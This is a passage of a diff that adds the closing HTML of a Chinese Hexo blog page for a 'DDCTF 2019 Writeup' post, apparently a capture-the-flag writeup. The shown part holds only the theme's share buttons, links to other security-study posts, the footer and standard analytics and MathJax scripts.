class="toc-number">4.3.</span> <span class="toc-text">Confused</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"DDCTF 2019 Writeup　| Hustcw　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+<!-- 添加打赏功能 -->
+
+
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/04/20/OSX装angr/" title="上一篇: OSX装angr">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/04/11/堆利用——布局内存任意地址写/" title="下一篇: 堆利用——布局内存任意地址写">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/堆上的off-by-null/">堆上的off-by-null</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/12/装IDA-Key-Patch/">windows IDA key-patch</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/最近的事/">最近的事情</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/29/荒废已久的pwn复习总结/">荒废已久的pwn复习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/ret2dl-runtime-resolve/">ret2dl_runtime_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/OSX装angr/">OSX装angr</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/19/DDCTF-2019-WriteUp/">DDCTF 2019 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/堆利用——布局内存任意地址写/">堆利用——布局内存任意地址写</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/转载-IDA代码类型转换/">转载:IDA代码类型转换</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/03/VMware-Fusion-NAT无法连接网络/">VMware Fusion NAT无法连接网络</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/堆利用/">堆利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/padding-oracle-attack/">padding oracle attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/29/格式化字符串/">格式化字符串</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/openssl相关知识/">openssl相关知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/xargs命令/">xargs命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/一个有趣的包——tqdm/">一个有趣的包——tqdm</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/python-gpg模块使用/">Python-gnupg Usage</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/ctf中常用模块之binascii/">ctf中常用模块之binascii</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/underfitting-overfitting/">underfitting & overfitting</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/现代密码学——对称加密和非对称加密/">密码学小整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/20/编译glibc遇到的问题/">编译glibc遇到的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/二进制的一些基本操作/">准备pwn环境的一些基本操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/64位ROP练习/">64位ROP练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/16/zip的选择明文攻击/">zip的选择明文攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/16/docker基本命令/">docker基本命令</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2019 hustcw
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#414141", "#e5a859", "#f5dfc6", "#847e72", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
